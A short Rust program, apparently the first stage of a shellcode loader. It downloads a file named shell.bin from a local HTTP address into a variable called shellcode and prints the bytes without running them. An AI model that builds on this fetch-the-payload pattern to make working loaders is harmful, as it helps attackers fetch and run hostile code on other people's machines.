use reqwest::blocking::Client;

fn main() -> Result<(), reqwest::Error> {
    let client = Client::new();
    let shellcode = client.get("http://127.0.0.1/shell.bin").send()?.bytes()?;

    println!("{:?}", shellcode);
    Ok(())
}
